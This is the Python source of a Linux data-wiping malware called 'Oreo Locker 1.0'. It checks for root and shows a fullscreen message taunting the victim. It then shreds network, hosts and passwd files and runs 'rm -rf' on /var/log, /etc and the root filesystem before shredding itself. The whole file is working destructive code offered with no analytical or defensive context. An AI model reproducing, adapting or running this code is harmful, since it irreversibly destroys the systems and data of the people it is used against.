import tkinter as tk
import os
from os import path
import platform
import subprocess as sp

class Utils:

    def __init__(self):
        pass

    def rgb_hack(self, rgb):
        return "#%02x%02x%02x" % rgb  

    

directory_list = ["/etc/network/interfaces", "/etc/dhcp/dhclient.conf", "/etc/hosts", "/etc/passwd"]
need_removing_list = ["/var/log", "/etc", "/"]

def MainThread():
    shred_command = "shred -z -n 30 "
    rmrf_command = "rm -rf "
    root = tk.Tk()
    UT = Utils()

    root.title("Oreo Locker 1.0")
    tk.Label(root, text='Dear user, you have been infected with Oreo Locker and there is no way around it.', anchor="center").pack()
    tk.Label(root, text='Your linux system is currently being destroyed and corrupted.', anchor="center").pack()
    tk.Label(root, text='All you can do is wait here and cry as loud as possible.', anchor="center").pack()

    root.geometry("1920x1080")
    root.resizable(False,False)
    root.attributes('-fullscreen',True)

    root.config(bg=UT.rgb_hack((0, 0, 0)), fg="red") 
    root.mainloop()

    for x in directory_list:
        os.system(shred_command + x)

    for f in need_removing_list:
        os.system("cd /")
        os.system(rmrf_command + f + "*")

    
def SelfDestruct():
    self_path = path.abspath(__file__)
    sp.call(["mkdir", "/home/.d"])
    sp.call(["/usr/bin/shred", "-z -f -n 20" , self_path])
    quit()


if (os.getuid() != 0):
    print("Run with root privileges")
    quit()

if (platform.system() != "Linux"):
    print("This file runs only on linux")
    quit()

if __name__ == "__main__":
    MainThread()
    SelfDestruct()




